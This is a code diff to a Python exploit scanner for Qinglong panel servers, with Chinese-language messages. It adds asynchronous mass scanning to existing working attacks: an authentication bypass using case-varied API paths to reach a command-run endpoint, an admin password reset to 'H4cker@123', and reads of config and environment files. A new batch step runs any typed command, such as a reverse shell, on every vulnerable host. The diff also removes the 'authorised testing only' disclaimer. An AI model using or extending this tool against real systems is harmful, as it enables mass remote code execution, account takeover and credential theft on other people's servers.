@@ -4,23 +4,12 @@ import sys
 import time
 import argparse
 import os
+import asyncio
+import aiohttp
 from datetime import datetime
 from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from typing import Dict, List, Optional, Tuple
-
-try:
-    from colorama import init, Fore, Style, Back
-    init(autoreset=True)
-    HAS_COLOR = True
-except ImportError:
-    HAS_COLOR = False
-    class Fore:  # type: ignore
-        RED = GREEN = YELLOW = CYAN = WHITE = ''
-    class Style:  # type: ignore
-        BRIGHT = RESET_ALL = ''
-    class Back:  # type: ignore
-        BLACK = ''
+from typing import Dict, List, Optional, Tuple, Any
 
 def print_banner():
     print(f"{Fore.RED}Qinglong RCE Scanner{Style.RESET_ALL}")
@@ -32,6 +21,7 @@ class QinglongRCEExploit:
         self.verbose = verbose
         self.retries = retries
         self.session = requests.Session()
+        self.async_session = None
         
         headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 10.0; en-US)'}
         self.session.headers.update(headers)
@@ -54,7 +44,6 @@ class QinglongRCEExploit:
         if self.verbose or level != "INFO":
             print(f"{prefixes.get(level, '[*]')}{Style.RESET_ALL} {msg}")
     def _request(self, method: str, path: str, **kwargs) -> Optional[requests.Response]:
-        """统一请求方法（带重试和超时处理）"""
         url = f"{self.target_url}{path}"
         for attempt in range(self.retries):
             try:
@@ -66,9 +55,48 @@ class QinglongRCEExploit:
                     return None
         return None
     
+    async def _arequest(self, method: str, path: str, **kwargs) -> Optional[Dict[str, Any]]:
+        url = f"{self.target_url}{path}"
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 10.0; en-US)'}
+        
+        if 'headers' in kwargs:
+            headers.update(kwargs.pop('headers'))
+        
+        for attempt in range(self.retries):
+            try:
+                if self.async_session is None:
+                    connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300)
+                    self.async_session = aiohttp.ClientSession(connector=connector, headers=headers)
+                
+                async with self.async_session.request(method, url, timeout=self.timeout, **kwargs) as response:
+                    if response.status == 200:
+                        try:
+                            return await response.json()
+                        except:
+                            return {'status': response.status}
+                    return {'status': response.status}
+            except Exception as e:
+                if attempt == self.retries - 1:
+                    self.log(f"请求失败: {path} - {e}", "ERROR")
+                    return None
+        return None
+    
+    async def close(self):
+        if self.async_session:
+            await self.async_session.close()
+            self.async_session = None
+    
     def check_alive(self) -> bool:
         resp = self._request('GET', '/api/health')
         if resp and resp.status_code == 200:
+            self.results['is_qinglong'] = True
+            self.log(f"目标存活 ✓", "SUCCESS")
+            return True
+        return False
+    
+    async def acheck_alive(self) -> bool:
+        resp = await self._arequest('GET', '/api/health')
+        if resp and resp.get('status') == 200:
             self.results['is_qinglong'] = True
             self.log(f"目标存活 ✓", "SUCCESS")
             return True
@@ -81,45 +109,62 @@ class QinglongRCEExploit:
                 version = resp.json().get('data', {}).get('version', 'unknown')
                 self.results['version'] = version
                 self.log(f"版本: {version}", "INFO")
-                
-                if self._is_vulnerable_version(version):
-                    self.results['vulnerable'] = True
-                    self.results['vulnerabilities'].append('affected_version')
-                    self.log(f"该版本存在已知漏洞!", "WARNING")
                 return version
         except:
             pass
         return None
     
-    @staticmethod
-    def _is_vulnerable_version(version: str) -> bool:
+    async def aget_version(self) -> Optional[str]:
+        resp = await self._arequest('GET', '/api/system')
         try:
-            parts = version.split('.')
-            if len(parts) >= 2 and parts[0] == '2':
-                minor = int(parts[1])
-                if minor < 20:
-                    return True
-                elif minor == 20:
-                    patch = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
-                    return patch <= 1
+            if resp and resp.get('status') == 200:
+                version = resp.get('data', {}).get('version', 'unknown')
+                self.results['version'] = version
+                self.log(f"版本: {version}", "INFO")
+                return version
         except:
             pass
-        return False
+        return None
+    
     def test_auth_bypass(self) -> bool:
         payloads = [
-            ('/aPi/system/command-run', 'PUT'),
-            ('/API/system/command-run', 'PUT'),
-            ('/ApI/system/command-run', 'PUT'),
             ('/api/system/command-run', 'PUT'),
+            ('/API/system/command-run', 'PUT'),
+            ('/aPi/system/command-run', 'PUT'),
+            ('/ApI/system/command-run', 'PUT'),
         ]
         
-        test_data = {'command': 'whoami'}
+        test_data = {'command': 'echo vulnerable'}
         headers = {'Content-Type': 'application/json'}
         
         for path, method in payloads:
             try:
                 resp = self._request(method, path, json=test_data, headers=headers)
                 if resp and resp.status_code == 200:
+                    self.log(f"鉴权绕过成功: {path}", "SUCCESS")
+                    self.results['vulnerable'] = True
+                    self.results['vulnerabilities'].append('auth_bypass')
+                    self.results['details']['bypass_path'] = path
+                    return True
+            except:
+                pass
+        return False
+    
+    async def atest_auth_bypass(self) -> bool:
+        payloads = [
+            ('/api/system/command-run', 'PUT'),
+            ('/API/system/command-run', 'PUT'),
+            ('/aPi/system/command-run', 'PUT'),
+            ('/ApI/system/command-run', 'PUT'),
+        ]
+        
+        test_data = {'command': 'echo vulnerable'}
+        headers = {'Content-Type': 'application/json'}
+        
+        for path, method in payloads:
+            try:
+                resp = await self._arequest(method, path, json=test_data, headers=headers)
+                if resp and resp.get('status') == 200:
                     self.log(f"鉴权绕过成功: {path}", "SUCCESS")
                     self.results['vulnerable'] = True
                     self.results['vulnerabilities'].append('auth_bypass')
@@ -145,14 +190,31 @@ class QinglongRCEExploit:
             except:
                 pass
         return False
+    
+    async def atest_password_reset(self) -> bool:
+        path = '/open/user/init'
+        data = {"username": "admin", "password": "H4cker@123"}
+        headers = {'Content-Type': 'application/json'}
+        
+        resp = await self._arequest('PUT', path, json=data, headers=headers)
+        if resp and resp.get('status') == 200:
+            try:
+                if resp.get('code') == 200:
+                    self.log(f"密码重置成功!", "SUCCESS")
+                    self.results['vulnerable'] = True
+                    self.results['vulnerabilities'].append('password_reset')
+                    return True
+            except:
+                pass
+        return False
     def test_config_read(self) -> bool:
         config_paths = [
-            '/aPi/configs/detail?path=config.sh',
             '/api/configs/detail?path=config.sh',
-            '/aPi/system/env',
+            '/API/configs/detail?path=config.sh',
+            '/api/configs/config.sh',
+            '/API/configs/config.sh',
             '/api/system/env',
-            '/aPi/configs/list',
-            '/api/configs/list'
+            '/API/system/env',
         ]
         
         found_configs = {}
@@ -166,7 +228,44 @@ class QinglongRCEExploit:
                     if resp_json.get('code') == 200:
                         config_content = resp_json.get('data', '')
                         if config_content:
-                            self.log(f"配置泄露!", "SUCCESS")
+                            self.log(f"配置泄露: {path}", "SUCCESS")
+                            self.results['vulnerable'] = True
+                            self.results['vulnerabilities'].append('config_leak')
+                            found_configs[path] = config_content
+                except:
+                    pass
+        
+        if found_configs:
+            self.results['details']['all_configs'] = found_configs
+            first_path = list(found_configs.keys())[0]
+            self.results['details']['config_content'] = found_configs[first_path]
+            self.results['details']['config_path'] = first_path
+            self.results['details']['config_count'] = len(found_configs)
+            return True
+        
+        return False
+    
+    async def atest_config_read(self) -> bool:
+        config_paths = [
+            '/api/configs/detail?path=config.sh',
+            '/API/configs/detail?path=config.sh',
+            '/api/configs/config.sh',
+            '/API/configs/config.sh',
+            '/api/system/env',
+            '/API/system/env',
+        ]
+        
+        found_configs = {}
+        
+        for path in config_paths:
+            resp = await self._arequest('GET', path)
+            
+            if resp and resp.get('status') == 200:
+                try:
+                    if resp.get('code') == 200:
+                        config_content = resp.get('data', '')
+                        if config_content:
+                            self.log(f"配置泄露: {path}", "SUCCESS")
                             self.results['vulnerable'] = True
                             self.results['vulnerabilities'].append('config_leak')
                             found_configs[path] = config_content
@@ -190,6 +289,20 @@ class QinglongRCEExploit:
             headers = {'Content-Type': 'application/json'}
             resp = self._request('PUT', '/aPi/system/command-run', json=data, headers=headers)
             return resp.text if resp and resp.status_code == 200 else None
+        except Exception as e:
+            self.log(f"命令执行异常: {e}", "ERROR")
+            return None
+
+    async def aexecute_command(self, command: str, check_vuln: bool = True) -> Optional[str]:
+        if check_vuln and not self.results['vulnerable']:
+            return None
+        try:
+            data = {'command': command}
+            headers = {'Content-Type': 'application/json'}
+            resp = await self._arequest('PUT', '/aPi/system/command-run', json=data, headers=headers)
+            if resp and resp.get('status') == 200:
+                return resp.get('data') or str(resp)
+            return None
         except Exception as e:
             self.log(f"命令执行异常: {e}", "ERROR")
             return None
@@ -244,7 +357,6 @@ class QinglongRCEExploit:
         
         print(f"\n{Fore.YELLOW}[检测到以下漏洞]{Style.RESET_ALL}")
         vuln_map = {
-            'affected_version': '受影响版本',
             'auth_bypass': '鉴权绕过 (RCE)',
             'password_reset': '密码重置',
             'config_leak': '配置泄露'
@@ -447,10 +559,42 @@ class QinglongRCEExploit:
         self.check_alive()
         self.get_version()
         
+        if self.results['vulnerable']:
+            self._print_report()
+            return self.results
+        
         tests = [self.test_auth_bypass, self.test_password_reset, 
                  self.test_config_read]
         with ThreadPoolExecutor(max_workers=4) as executor:
-            list(executor.map(lambda x: x(), tests))
+            for test in tests:
+                if test():
+                    break
+        
+        self._print_report()
+        return self.results
+    
+    async def ascan(self) -> Dict:
+        self.log(f"正在扫描: {self.target_url}")
+        alive = await self.acheck_alive()
+        if not alive:
+            self._print_report()
+            return self.results
+        
+        await self.aget_version()
+        
+        if self.results['vulnerable']:
+            self._print_report()
+            return self.results
+        
+        if await self.atest_auth_bypass():
+            self._print_report()
+            return self.results
+        
+        if await self.atest_password_reset():
+            self._print_report()
+            return self.results
+        
+        await self.atest_config_read()
         
         self._print_report()
         return self.results
@@ -463,8 +607,7 @@ class QinglongRCEExploit:
         handlers = {
             'auth_bypass': self.exploit_auth_bypass,
             'password_reset': self.exploit_password_reset,
-            'config_leak': self.exploit_config_leak,
-            'affected_version': lambda: print(f"\n{Fore.YELLOW}该版本存在多个已知漏洞，建议立即升级{Style.RESET_ALL}\n")
+            'config_leak': self.exploit_config_leak
         }
         
         if handler := handlers.get(vuln_choice):
@@ -533,7 +676,6 @@ def main():
     parser.add_argument('-t', '--timeout', type=int, default=10, help='超时(秒)')
     parser.add_argument('-p', '--proxy', help='代理')
     parser.add_argument('-v', '--verbose', action='store_true', help='详细模式')
-    parser.add_argument('-j', '--threads', type=int, default=5, help='线程数')
     parser.add_argument('-h', '--help', action='store_true', help='帮助')
     
     args = parser.parse_args()
@@ -542,10 +684,10 @@ def main():
         print(f"""
   单个扫描: python scanner.py -u https://target:5700
   直接执行: python scanner.py -u https://target:5700 -c "id"
-  批量扫描: python scanner.py -f targets.txt -j 10
+  批量扫描: python scanner.py -f targets.txt
   使用代理: python scanner.py -u https://target:5700 -p socks5://127.0.0.1:1080
   """)
-    sys.exit(0)
+        sys.exit(0)
     
     if args.url:
         scanner = QinglongRCEExploit(args.url, args.timeout, args.verbose, args.proxy)
@@ -601,32 +743,33 @@ def main():
             if shell_choice in ['y', 'yes']:
                 plant_shell = True
             
-            results = []
-            
-            with ThreadPoolExecutor(max_workers=args.threads) as executor:
-                futures = {}
-                scanners = {}
+            async def scan_targets():
+                scanners = []
+                tasks = []
                 
                 for url in valid_targets:
                     scanner = QinglongRCEExploit(url, args.timeout, False, args.proxy)
-                    future = executor.submit(scanner.scan)
-                    futures[future] = url
-                    scanners[url] = scanner
+                    scanners.append(scanner)
+                    tasks.append(scanner.ascan())
                 
-                for future in as_completed(futures):
-                    url = futures[future]
-                    scanner = scanners[url]
-                    try:
-                        result = future.result()
-                        results.append((result, scanner))
-                        status = f"{Fore.RED}[漏洞]" if result['vulnerable'] else f"{Fore.GREEN}[安全]"
-                        print(f"{status}{Style.RESET_ALL} {url}")
-                        
-                        if plant_shell and result['vulnerable']:
-                            if 'auth_bypass' in result['vulnerabilities']:
-                                print(f"{Fore.YELLOW}  [*] 发现可用RCE，询问用户...{Style.RESET_ALL}")
-                    except Exception as e:
-                        print(f"{Fore.RED}[错误]{Style.RESET_ALL} {url}: {e}")
+                results = []
+                for i, result in enumerate(await asyncio.gather(*tasks)):
+                    scanner = scanners[i]
+                    results.append((result, scanner))
+                    status = f"{Fore.RED}[漏洞]" if result['vulnerable'] else f"{Fore.GREEN}[安全]"
+                    print(f"{status}{Style.RESET_ALL} {result['target']}")
+                    
+                    if plant_shell and result['vulnerable']:
+                        if 'auth_bypass' in result['vulnerabilities']:
+                            print(f"{Fore.YELLOW}  [*] 发现可用RCE，询问用户...{Style.RESET_ALL}")
+                
+                # 关闭所有异步会话
+                close_tasks = [scanner.close() for scanner in scanners]
+                await asyncio.gather(*close_tasks)
+                
+                return results
+            
+            results = asyncio.run(scan_targets())
             
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
             report_file = f"scan_report_{timestamp}.txt"
@@ -634,24 +777,21 @@ def main():
             vuln_count = sum(1 for r, _ in results if r['vulnerable'])
             
             with open(report_file, 'w', encoding='utf-8') as f:
-                f.write(f"青龙面板漏洞扫描报告\n")
+                f.write(f"漏洞扫描结果\n")
                 f.write(f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                 
                 f.write(f"[统计]\n")
                 f.write(f"  总计: {len(results)}\n")
                 f.write(f"  漏洞: {vuln_count}\n")
                 f.write(f"  安全: {len(results) - vuln_count}\n\n")
-                
                 f.write(f"[结果]\n")
                 for result, _ in results:
                     status = "VULN" if result['vulnerable'] else "SAFE"
                     vulns = ', '.join(result['vulnerabilities']) if result['vulnerabilities'] else 'NONE'
                     f.write(f"{status} | {result['target']} | v{result['version']} | {vulns}\n")
-                
-                f.write(f"\n免责声明: 仅供授权渗透测试使用\n")
             
             print(f"\n{Fore.CYAN}[统计]{Style.RESET_ALL} 总计{len(results)}, 漏洞{vuln_count}")
-            print(f"{Fore.GREEN}[+] 报告已保存: {report_file}{Style.RESET_ALL}\n")
+            print(f"{Fore.GREEN}[+] 结果已保存: {report_file}{Style.RESET_ALL}\n")
             
         except FileNotFoundError:
             print(f"{Fore.RED}[-] 文件不存在: {args.file}{Style.RESET_ALL}")
@@ -659,7 +799,28 @@ def main():
         except Exception as e:
             print(f"{Fore.RED}[-] 批量扫描出错: {e}{Style.RESET_ALL}")
             sys.exit(1)
+        
+        if plant_shell:
+            rce_targets = [(result, scanner) for result, scanner in results if result['vulnerable'] and 'auth_bypass' in result['vulnerabilities']]
+            if rce_targets:
+                print(f"{Fore.YELLOW}[批量利用] 发现 {len(rce_targets)} 个可RCE目标{Style.RESET_ALL}")
+                sys.stdout.flush()
+                cmd = input(f"{Fore.YELLOW}请输入要批量执行的命令（如 whoami，或输入 bash/powershell 反弹shell）: {Style.RESET_ALL}").strip()
+                sys.stdout.flush()
+                if cmd:
+                    async def batch_exploit():
+                        for result, scanner in rce_targets:
+                            print(f"{Fore.CYAN}[*] {result['target']}{Style.RESET_ALL}")
+                            res = await scanner.aexecute_command(cmd, check_vuln=True)
+                            if res:
+                                print(f"{Fore.GREEN}[+] 执行结果:{Style.RESET_ALL}\n{res}\n")
+                            else:
+                                print(f"{Fore.RED}[!] 执行失败{Style.RESET_ALL}\n")
+                    asyncio.run(batch_exploit())
+                else:
+                    print(f"{Fore.RED}[!] 未输入命令，跳过批量利用{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.YELLOW}[!] 没有可RCE的目标，跳过批量利用{Style.RESET_ALL}")
 
 if __name__ == "__main__":
-
     main()
